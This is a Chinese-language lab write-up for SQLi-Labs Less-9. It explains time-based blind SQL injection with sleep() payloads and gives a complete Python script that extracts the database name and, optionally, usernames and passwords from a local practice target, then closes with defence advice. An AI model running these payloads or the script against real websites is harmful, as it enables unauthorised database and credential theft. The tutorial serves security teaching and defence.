## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：困难
- 通关标识：在页面没有任何回显、报错甚至真假状态区分的情况下，利用时间延迟函数（sleep）和 Python 脚本，猜解出数据库名及数据。

## 二、大白话原理讲解
这一关的柜员（数据库）是个终极“面瘫”。
你输入对的，他显示 `You are in...`；你输入错的，他还是显示 `You are in...`。他不给你看数据，不给你报错，连上一关那种“猜错就变空白”的小提示都掐断了。

既然看不了、听不到，我们怎么知道他到底有没有按我们的要求去查？
答案是：**看表（时间）**。
我们给他下指令：“如果你查到了数据（条件为真），你就原地睡 5 秒再给我开门；如果没查到，你就立刻开门。”
结果我们发现，等了 5 秒他才开门。这就说明，条件猜对了！这种利用“页面加载时间差”来推断数据的注入，叫作**时间盲注**（Time-based Blind）。

## 三、解题步骤

**1. 测试闭合与时间延迟逻辑**
由于没有报错，我们先测单引号闭合。在地址栏输入：
```sql
?id=1' and if(1=1, sleep(5), 1) --+
```
*(注：`if(条件, 成立执行, 不成立执行)`，`sleep(5)` 表示睡眠 5 秒)*
**现象**：页面转圈卡了约 5 秒才加载出来（真）。
再次输入：
```sql
?id=1' and if(1=2, sleep(5), 1) --+
```
**现象**：页面瞬间加载，没有任何卡顿（假）。

**2. 手工测试原理（极不推荐）**
*   **猜长度**：`?id=1' and if(length(database())=8, sleep(5), 1) --+` （如果卡 5 秒，说明库名长 8）。
*   **猜字符**：`?id=1' and if(ascii(substr(database(),1,1))=115, sleep(5), 1) --+` （猜第一个字符 ASCII 是否为 115）。
*   因为每次猜都要等 5 秒，如果猜几百次，耗费几个小时，所以必须使用脚本。

**3. Python 自动化盲注脚本**
利用 `requests` 库发起请求，利用 `time` 库计算请求耗时。如果耗时超过设定的阈值，就说明条件为真。

```python
import requests
import time

# 靶场地址
url = "http://127.0.0.1/sqli-labs-master/Less-9/?id=1'"
# 设置延迟时间（秒）
delay_time = 2
# 响应时间阈值（超过 1.5 秒认为触发了 sleep）
threshold = delay_time - 0.5 

def get_length(sql_query):
    for length in range(1, 50):
        payload = f" and if(length(({sql_query}))={length}, sleep({delay_time}), 1) --+"
        start_time = time.time()
        try:
            requests.get(url + payload, timeout=10)
        except:
            pass
        elapsed_time = time.time() - start_time
        if elapsed_time > threshold:
            return length
    return 0

def get_data(sql_query, length):
    result = ""
    print(f"[*] 正在提取数据 (长度: {length})...")
    for i in range(1, length + 1):
        low = 32
        high = 127
        while low <= high:
            mid = (low + high) // 2
            payload = f" and if(ascii(substr(({sql_query}),{i},1))>{mid}, sleep({delay_time}), 1) --+"
            start_time = time.time()
            try:
                requests.get(url + payload, timeout=10)
            except:
                pass
            elapsed_time = time.time() - start_time
            if elapsed_time > threshold:
                low = mid + 1
            else:
                high = mid - 1
        result += chr(low)
        print(f"[+] 当前结果: {result}")
    return result

if __name__ == "__main__":
    print("[*] 开始时间盲注探测...")
    # 查库名
    query = "select database()"
    
    # 查账号密码可改为：
    # query = "select concat(username,0x3a,password) from users limit 0,1"
    
    db_len = get_length(query)
    if db_len > 0:
        print(f"[+] 探测到长度: {db_len}")
        db_name = get_data(query, db_len)
        print(f"\n[🎉] 成功爆出数据: {db_name}")
    else:
        print("\n[-] 失败。请检查 URL 或延迟时间设置。")
```

**4. 运行结果**
在终端运行 `python time_blind.py`。你会看到脚本每输出一个字母都会“卡顿”几秒（因为它在等待数据库睡眠），最终成功提取出 `security` 或账号密码 `Dumb:Dumb`。

## 四、知识点解析
1. **时间盲注**：在页面完全没有回显和报错的情况下，利用 `sleep()` 函数造成页面加载延迟，作为判断条件真假的唯一依据。
2. **if(条件, 真, 假)**：MySQL 逻辑判断函数。如果条件成立，执行第二个参数（例如 `sleep(5)`）；否则执行第三个参数。
3. **请求耗时分析**：在自动化脚本中，通过在请求前后打时间戳（`time.time()`），计算网络往返时间，以此作为判断 `sleep` 是否被执行的依据。

## 五、总结与防御
**本题总结**：
时间盲注是盲注的最终形态。因为没有任何视觉反馈，必须依赖脚本进行时间差分析。需要注意的是，如果网络本身很慢，需要适当调整阈值以防误判。

**安全防御建议**：
- **预编译语句（PDO/MySQLi）**：彻底修复 SQL 注入漏洞，让任何注入语句都无法执行。
- **严格控制查询时间**：在代码层面为数据库查询设置超时限制，防止被恶意的 `sleep()` 拖垮服务器。
